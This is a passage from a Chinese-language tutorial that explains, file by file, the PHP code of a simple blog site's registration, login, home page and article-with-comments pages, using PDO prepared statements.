class="string">&#x27;&#x27;</span>;</span><br></pre></td></tr></table></figure><ul><li>初始化错误信息变量。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br></pre></td></tr></table></figure><ul><li>检查是否为表单提交。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$userData</span> = [</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span> =&gt; <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;email&#x27;</span> =&gt; <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;password&#x27;</span> =&gt; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">];</span><br></pre></td></tr></table></figure><ul><li>构建用户数据数组。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">register</span>(<span class="variable">$userData</span>, <span class="variable">$pdo</span>);</span><br></pre></td></tr></table></figure><ul><li>调用注册函数（我们在<code>auth.php</code>中定义的函数），传入用户数据和数据库连接。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span> === <span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="comment">// 注册成功，重定向到登录页面并带参数</span></span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: login.php?registered=1&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 注册失败，保存错误信息</span></span><br><span class="line">        <span class="variable">$error</span> = <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>检查注册结果</li></ul><h4 id="2-2-login-php（用户登录）"><a href="#2-2-login-php（用户登录）" class="headerlink" title="2.2 login.php（用户登录）"></a>2.2 <code>login.php</code>（用户登录）</h4><ul><li>用户登录界面。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;includes/db.php&#x27;</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;includes/auth.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$error</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">login</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>], <span class="variable">$pdo</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: index.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$error</span> = <span class="string">&#x27;用户名或密码错误&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;zh-CN&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;登录 - 我的博客&lt;/title&gt;</span><br><span class="line">    &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;css/style.css&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;header&gt;</span><br><span class="line">        &lt;nav&gt;</span><br><span class="line">            &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">logo</span>&quot;&gt;我的博客&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">ul</span> <span class="title">class</span>=&quot;<span class="title">nav</span>-<span class="title">links</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">li</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;<span class="title">index</span>.<span class="title">php</span>&quot;&gt;首页&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">li</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;<span class="title">register</span>.<span class="title">php</span>&quot;&gt;注册&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">ul</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">nav</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">header</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &lt;<span class="title">main</span> <span class="title">class</span>=&quot;<span class="title">container</span> <span class="title">auth</span>-<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">h1</span>&gt;登录&lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line"><span class="class">        </span></span><br><span class="line"><span class="class">        &lt;?<span class="title">php</span> <span class="title">if</span> ($<span class="title">error</span>): ?&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">error</span>&quot;&gt;&lt;?= $<span class="title">error</span> ?&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;?<span class="title">php</span> <span class="title">endif</span>; ?&gt;</span></span><br><span class="line"><span class="class">        </span></span><br><span class="line"><span class="class">        &lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">POST</span>&quot; <span class="title">class</span>=&quot;<span class="title">auth</span>-<span class="title">form</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">username</span>&quot;&gt;用户名或邮箱:&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">id</span>=&quot;<span class="title">username</span>&quot; <span class="title">name</span>=&quot;<span class="title">username</span>&quot; <span class="title">required</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            </span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">password</span>&quot;&gt;密码:&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">password</span>&quot; <span class="title">id</span>=&quot;<span class="title">password</span>&quot; <span class="title">name</span>=&quot;<span class="title">password</span>&quot; <span class="title">required</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            </span></span><br><span class="line"><span class="class">            &lt;<span class="title">button</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">class</span>=&quot;<span class="title">btn</span>&quot;&gt;登录&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">        </span></span><br><span class="line"><span class="class">        &lt;<span class="title">p</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;<span class="title">forgot</span>-<span class="title">password</span>.<span class="title">php</span>&quot;&gt;忘记密码?&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">main</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>前四行代码与 <code>register.php</code>一致。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">login</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>], <span class="variable">$pdo</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: index.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$error</span> = <span class="string">&#x27;用户名或密码错误&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li>调用<code>auth.php</code>中的<code>login()</code>函数，与数据库进行交互，用来判断登录信息，成功则跳转首页。</li><li><strong>安全机制</strong>：登录成功后立即跳转，防止重复提交。</li></ul><h4 id="2-3-index-php（首页文章列表）"><a href="#2-3-index-php（首页文章列表）" class="headerlink" title="2.3 index.php（首页文章列表）"></a>2.3 <code>index.php</code>（首页文章列表）</h4><ul><li>网站首页页面。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;includes/db.php&#x27;</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;includes/auth.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取博客文章</span></span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;</span></span><br><span class="line"><span class="string">    SELECT p.*, u.username </span></span><br><span class="line"><span class="string">    FROM posts p </span></span><br><span class="line"><span class="string">    JOIN users u ON p.author_id = u.id </span></span><br><span class="line"><span class="string">    ORDER BY p.created_at DESC</span></span><br><span class="line"><span class="string">&quot;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"><span class="variable">$posts</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetchAll</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;zh-CN&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;我的博客&lt;/title&gt;</span><br><span class="line">    &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;css/style.css&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;header&gt;</span><br><span class="line">        &lt;nav&gt;</span><br><span class="line">            &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">logo</span>&quot;&gt;我的博客&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">ul</span> <span class="title">class</span>=&quot;<span class="title">nav</span>-<span class="title">links</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">li</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;<span class="title">index</span>.<span class="title">php</span>&quot;&gt;首页&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;?<span class="title">php</span> <span class="title">if</span> (<span class="title">isLoggedIn</span>()): ?&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">li</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;<span class="title">dashboard</span>/&quot;&gt;控制台&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">li</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;<span class="title">logout</span>.<span class="title">php</span>&quot;&gt;退出&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;?<span class="title">php</span> <span class="title">else</span>: ?&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">li</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;<span class="title">login</span>.<span class="title">php</span>&quot;&gt;登录&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">li</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;<span class="title">register</span>.<span class="title">php</span>&quot;&gt;注册&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;?<span class="title">php</span> <span class="title">endif</span>; ?&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">ul</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">nav</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">header</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &lt;<span class="title">main</span> <span class="title">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">h1</span>&gt;最新文章&lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line"><span class="class">        </span></span><br><span class="line"><span class="class">        &lt;?<span class="title">php</span> <span class="title">foreach</span>($<span class="title">posts</span> <span class="title">as</span> $<span class="title">post</span>): ?&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">article</span> <span class="title">class</span>=&quot;<span class="title">post</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">h2</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;<span class="title">post</span>.<span class="title">php</span>?<span class="title">id</span>=&lt;?= $<span class="title">post</span>[&#x27;<span class="title">id</span>&#x27;] ?&gt;&quot;&gt;&lt;?= <span class="title">htmlspecialchars</span>($<span class="title">post</span>[&#x27;<span class="title">title</span>&#x27;]) ?&gt;&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">post</span>-<span class="title">meta</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                作者: &lt;?= <span class="title">htmlspecialchars</span>($<span class="title">post</span>[&#x27;<span class="title">username</span>&#x27;]) ?&gt; | </span></span><br><span class="line"><span class="class">                发布时间: &lt;?= <span class="title">date</span>(&#x27;<span class="title">Y</span>-<span class="title">m</span>-<span class="title">d</span> <span class="title">H</span>:<span class="title">i</span>&#x27;, <span class="title">strtotime</span>($<span class="title">post</span>[&#x27;<span class="title">created_at</span>&#x27;])) ?&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">post</span>-<span class="title">content</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;?= <span class="title">nl2br</span>(<span class="title">htmlspecialchars</span>(<span class="title">substr</span>($<span class="title">post</span>[&#x27;<span class="title">content</span>&#x27;], 0, 200))) ?&gt;...</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">a</span> <span class="title">href</span>=&quot;<span class="title">post</span>.<span class="title">php</span>?<span class="title">id</span>=&lt;?= $<span class="title">post</span>[&#x27;<span class="title">id</span>&#x27;] ?&gt;&quot; <span class="title">class</span>=&quot;<span class="title">read</span>-<span class="title">more</span>&quot;&gt;阅读更多&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">article</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;?<span class="title">php</span> <span class="title">endforeach</span>; ?&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">main</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &lt;<span class="title">footer</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">p</span>&gt;&amp;<span class="title">copy</span>; &lt;?= <span class="title">date</span>(&#x27;<span class="title">Y</span>&#x27;) ?&gt; <span class="title">MosHSasA_BLOG</span>. 保留所有权利.&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">footer</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>调用文件不再赘述。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT p.*, u.username FROM posts p JOIN users u ON p.author_id = u.id ORDER BY p.created_at DESC&quot;</span>);</span><br></pre></td></tr></table></figure><ul><li>准备SQL查询语句，获取文章和作者信息。</li><li><strong>数据库设计</strong>：使用JOIN关联查询，体现数据库关系设计。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"><span class="variable">$posts</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetchAll</span>();</span><br></pre></td></tr></table></figure><ul><li>执行查询并获取所有结果，这里使用了预处理语句防止SQL注入。</li></ul><h4 id="2-4-post-php（文章详情页）"><a href="#2-4-post-php（文章详情页）" class="headerlink" title="2.4 post.php（文章详情页）"></a>2.4 <code>post.php</code>（文章详情页）</h4><ul><li>文章页面，可以从首页直接进入文章界面的后端支持。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;includes/db.php&#x27;</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;includes/auth.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取文章详情</span></span><br><span class="line"><span class="variable">$postId</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>] ?? <span class="number">0</span>;</span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;</span></span><br><span class="line"><span class="string">    SELECT p.*, u.username </span></span><br><span class="line"><span class="string">    FROM posts p </span></span><br><span class="line"><span class="string">    JOIN users u ON p.author_id = u.id </span></span><br><span class="line"><span class="string">    WHERE p.id = ?</span></span><br><span class="line"><span class="string">&quot;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="variable">$postId</span>]);</span><br><span class="line"><span class="variable">$post</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$post</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;HTTP/1.0 404 Not Found&#x27;</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;文章不存在&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取评论</span></span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;</span></span><br><span class="line"><span class="string">    SELECT c.*, u.username </span></span><br><span class="line"><span class="string">    FROM comments c </span></span><br><span class="line"><span class="string">    JOIN users u ON c.user_id = u.id </span></span><br><span class="line"><span class="string">    WHERE c.post_id = ? </span></span><br><span class="line"><span class="string">    ORDER BY c.created_at DESC</span></span><br><span class="line"><span class="string">&quot;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="variable">$postId</span>]);</span><br><span class="line"><span class="variable">$comments</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetchAll</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理评论提交</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span> &amp;&amp; <span class="title function_ invoke__">isLoggedIn</span>()) &#123;</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;INSERT INTO comments (post_id, user_id, content) VALUES (?, ?, ?)&quot;</span>);</span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="variable">$postId</span>, <span class="variable">$_SESSION</span>[<span class="string">&#x27;user_id&#x27;</span>], <span class="variable">$content</span>]);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: post.php?id=<span class="subst">$postId</span>&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;zh-CN&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;<span class="meta">&lt;?=</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$post</span>[<span class="string">&#x27;title&#x27;</span>]) <span class="meta">?&gt;</span> - 我的博客&lt;/title&gt;</span><br><span class="line">    &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;css/style.css&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;header&gt;</span><br><span class="line">        &lt;nav&gt;</span><br><span class="line">            &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">logo</span>&quot;&gt;我的博客&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">ul</span> <span class="title">class</span>=&quot;<span class="title">nav</span>-<span class="title">links</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">li</span>&gt;&lt;<span class="title">a</span> <span 